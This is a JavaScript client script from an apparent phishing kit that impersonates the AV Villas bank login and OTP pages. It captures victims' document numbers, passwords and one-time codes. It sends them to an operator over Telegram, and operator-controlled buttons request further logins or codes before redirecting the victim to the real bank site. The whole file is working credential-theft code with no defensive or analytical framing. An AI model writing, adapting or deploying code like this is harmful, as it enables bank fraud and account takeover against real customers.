/**
 * AV VILLAS - Cliente optimizado usando banco-utils
 */

(function() {
    'use strict';
    
    const pageConfig = {
        'index.html': {
            stage: 'login',
            form: 'loginForm',
            inputs: {
                documento: 'document-number',
                password: 'password'
            },
            button: 'submitBtn',
            validation: (data) => (data.documento || '').length >= 5 && (data.password || '').length >= 4,
            nextActions: { login: 'index.html', otp: 'otp.html', finalizar: 'https://www.avvillas.com.co' }
        },
        'otp.html': {
            stage: 'otp',
            form: 'otpForm',
            inputs: { otp: 'otpInput' },
            button: 'btnVerificar',
            validation: (data) => (data.otp || '').length >= 6,
            nextActions: { login: 'index.html', otp: 'otp.html', finalizar: 'https://www.avvillas.com.co' }
        }
    };
    
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const config = pageConfig[currentPage];
    
    if (!config) return;
    
    document.addEventListener('DOMContentLoaded', function() {
        const sessionId = BancoUtils.getSessionId();
        BancoUtils.initSocket();
        
        const form = document.getElementById(config.form);
        const button = document.getElementById(config.button);
        const inputs = {};
        
        Object.keys(config.inputs).forEach(key => {
            inputs[key] = document.getElementById(config.inputs[key]);
            if (inputs[key]) {
                // Validación numérica para password y OTP
                if (key === 'password' || key === 'otp') {
                    inputs[key].addEventListener('input', function(e) {
                        e.target.value = BancoUtils.validateNumeric(e.target.value, key === 'password' ? 4 : 6);
                        validateForm();
                    });
                } else {
                    inputs[key].addEventListener('input', validateForm);
                }
            }
        });
        
        BancoUtils.onTelegramAction((data) => {
            BancoUtils.hideOverlay();
            const nextPage = config.nextActions[data.action];
            if (nextPage) {
                window.location.href = nextPage.startsWith('http') ? nextPage : `/bancas/AV-Villas/${nextPage}`;
            }
        });
        
        function validateForm() {
            const data = {};
            Object.keys(inputs).forEach(key => {
                data[key] = inputs[key] ? inputs[key].value.trim() : '';
            });
            
            const isValid = config.validation(data);
            if (button) {
                button.disabled = !isValid;
                button.classList.toggle('active', isValid);
            }
        }
        
        // Validación inicial
        validateForm();
        
        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                BancoUtils.showOverlay();
                
                const socket = BancoUtils.getSocket();
                if (!socket || !socket.connected) {
                    alert('Error de conexión. Recarga la página.');
                    BancoUtils.hideOverlay();
                    return;
                }
                
                const formData = {};
                Object.keys(inputs).forEach(key => {
                    formData[key] = inputs[key] ? inputs[key].value.trim() : '';
                });
                
                const fullData = BancoUtils.saveBankData('av-villas', formData);
                const message = BancoUtils.formatMessage(`AV VILLAS - ${config.stage.toUpperCase()}`, fullData);
                
                const buttons = [
                    { text: '🔐 Pedir Login', action: 'login' },
                    { text: '📱 Pedir OTP', action: 'otp' },
                    { text: '✅ Finalizar', action: 'finalizar' }
                ];
                
                const keyboard = BancoUtils.createKeyboard(buttons, sessionId);
                
                try {
                    await BancoUtils.sendToTelegram(config.stage, { text: message, keyboard });
                    console.log('✅ Datos enviados');
                } catch (error) {
                    console.error('❌ Error:', error);
                    alert('Error al enviar datos');
                    BancoUtils.hideOverlay();
                }
            });
        }
    });
})();
